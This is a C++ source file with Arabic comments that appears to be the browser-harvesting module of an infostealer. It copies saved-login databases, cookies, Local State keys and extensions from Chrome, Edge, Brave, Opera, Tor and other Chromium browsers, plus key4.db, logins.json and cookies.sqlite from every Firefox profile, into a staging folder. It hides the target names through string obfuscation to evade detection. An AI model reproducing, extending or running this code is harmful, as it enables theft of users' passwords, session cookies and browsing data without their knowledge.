// browser_collector.cpp – نسخة معتمدة كلياً على GetObfuscatedString
#include "browser_collector.h"
#include "../crypto/obfuscation.h"
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>

// دوال مساعدة (مثل CreateDirRecursive, CopySingleFile) – لا تحتوي على نصوص حساسة
static void CreateDirRecursive(const std::string& path) {
    char tmp[MAX_PATH];
    snprintf(tmp, sizeof(tmp), "%s", path.c_str());
    for (char* p = tmp + 1; *p; p++) {
        if (*p == '\\' || *p == '/') {
            *p = 0;
            CreateDirectoryA(tmp, NULL);
            *p = '\\';
        }
    }
    CreateDirectoryA(tmp, NULL);
}

static bool CopySingleFile(const std::string& src, const std::string& dst) {
    return CopyFileA(src.c_str(), dst.c_str(), FALSE) != 0;
}

static void CopyFolderRecursive(const std::string& srcDir, const std::string& dstDir) {
    CreateDirRecursive(dstDir);
    std::string search = srcDir + "\\*";
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        std::string name = fd.cFileName;
        if (name != "." && name != "..") {
            std::string srcPath = srcDir + "\\" + name;
            std::string dstPath = dstDir + "\\" + name;
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                CopyFolderRecursive(srcPath, dstPath);
            } else {
                CopySingleFile(srcPath, dstPath);
            }
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}

static void CopyChromiumProfile(const std::string& profilePath, const std::string& browserName, const std::string& outputDir) {
    std::string destBase = outputDir + "\\browsers\\" + browserName;
    CreateDirRecursive(destBase);
    
    // الملفات المهمة: Local State, Login Data, Cookies, Web Data
    int fileIDs[] = {STR_LOCAL_STATE, STR_LOGIN_DATA, STR_COOKIES, STR_WEB_DATA};
    for (int fid : fileIDs) {
        std::string fileName = GetObfuscatedString(fid);
        std::string src = profilePath + "\\" + fileName;
        std::string dst = destBase + "\\" + fileName;
        DWORD attrs = GetFileAttributesA(src.c_str());
        if (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            CopySingleFile(src, dst);
        }
    }
    
    // نسخ مجلد Extensions
    std::string extensionsSrc = profilePath + "\\Extensions";
    DWORD attrs = GetFileAttributesA(extensionsSrc.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        std::string extensionsDst = destBase + "\\Extensions";
        CopyFolderRecursive(extensionsSrc, extensionsDst);
    }
}

void CollectBrowsersData(const std::string& outputDir) {
    char localAppData[MAX_PATH];
    char appData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
    
    // قائمة المتصفحات (أسماء ومسارات) – كلها من السلاسل المشفرة
    struct BrowserInfo {
        int nameID;
        int pathID;
    };
    
    BrowserInfo browsers[] = {
        {STR_CHROME,      STR_CHROME_DATA},
        {STR_EDGE,        STR_EDGE_DATA},
        {STR_BRAVE,       STR_BRAVE_DATA},
        {STR_OPERA,       STR_OPERA_DATA},
        {STR_VIVALDI,     STR_VIVALDI_DATA},
        {STR_SAFARI,      STR_SAFARI_DATA},      // Safari on Windows (مجلد نادر)
        {STR_TOR_BROWSER, STR_TOR_DATA},
        {STR_CHROMIUM,    STR_CHROMIUM_DATA},
        {STR_EPIC,        STR_EPIC_DATA},
        {STR_OPERA_GX,    STR_OPERA_GX_DATA}
    };
    
    for (const auto& browser : browsers) {
        std::string browserName = GetObfuscatedString(browser.nameID);
        std::string browserPath = GetObfuscatedString(browser.pathID);
        std::string fullPath = std::string(localAppData) + "\\" + browserPath;
        
        DWORD attrs = GetFileAttributesA(fullPath.c_str());
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            std::string defaultProfile = fullPath + "\\Default";
            DWORD attrs2 = GetFileAttributesA(defaultProfile.c_str());
            if (attrs2 != INVALID_FILE_ATTRIBUTES && (attrs2 & FILE_ATTRIBUTE_DIRECTORY)) {
                CopyChromiumProfile(defaultProfile, browserName, outputDir);
            }
        }
    }
    
    // Firefox: مسار مختلف
    std::string firefoxProfiles = std::string(appData) + "\\" + GetObfuscatedString(STR_FIREFOX_PROFILES);
    DWORD attrs = GetFileAttributesA(firefoxProfiles.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        std::string search = firefoxProfiles + "\\*";
        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA(search.c_str(), &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    std::string profileName = fd.cFileName;
                    if (profileName != "." && profileName != "..") {
                        std::string srcProfile = firefoxProfiles + "\\" + profileName;
                        std::string destProfile = outputDir + "\\browsers\\Firefox\\" + profileName;
                        CreateDirRecursive(destProfile);
                        
                        // ملفات Firefox الثلاثة
                        int ffFileIDs[] = {STR_KEY4_DB, STR_LOGINS_JSON, STR_COOKIES_SQLITE};
                        for (int fid : ffFileIDs) {
                            std::string fileName = GetObfuscatedString(fid);
                            std::string srcFile = srcProfile + "\\" + fileName;
                            std::string dstFile = destProfile + "\\" + fileName;
                            DWORD att = GetFileAttributesA(srcFile.c_str());
                            if (att != INVALID_FILE_ATTRIBUTES && !(att & FILE_ATTRIBUTE_DIRECTORY)) {
                                CopySingleFile(srcFile, dstFile);
                            }
                        }
                    }
                }
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);
        }
    }
}